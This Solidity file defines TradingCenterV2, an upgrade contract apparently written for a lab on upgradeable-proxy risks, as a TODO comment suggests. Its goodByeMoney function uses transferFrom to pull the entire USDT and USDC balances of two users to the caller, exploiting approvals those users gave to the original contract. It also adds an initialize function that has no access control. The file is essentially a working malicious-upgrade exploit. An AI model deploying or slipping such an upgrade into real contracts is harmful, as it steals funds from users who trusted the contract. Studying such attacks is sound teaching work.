// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;
import {TradingCenter} from "./TradingCenter.sol";

// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 is TradingCenter {
    function initialize() public {
        require(initialized == false, "already initialized");
        initialized = true;
    }

    function goodByeMoney(address user1, address user2) public {
        uint user1UsdtBalance = usdt.balanceOf(user1);
        uint user1UsdcBalance = usdc.balanceOf(user1);
        uint user2UsdtBalance = usdt.balanceOf(user2);
        uint user2UsdcBalance = usdc.balanceOf(user2);
        usdt.transferFrom(user1, msg.sender, user1UsdtBalance);
        usdt.transferFrom(user2, msg.sender, user2UsdtBalance);
        usdc.transferFrom(user1, msg.sender, user1UsdcBalance);
        usdc.transferFrom(user2, msg.sender, user2UsdcBalance);
    }
}
